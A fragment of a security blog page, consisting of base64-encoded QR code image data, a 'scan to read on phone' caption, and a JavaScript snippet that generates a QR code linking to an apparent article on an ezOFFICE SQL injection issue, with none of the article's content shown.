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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-govdocumentmanager\_sendfile\_gd-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 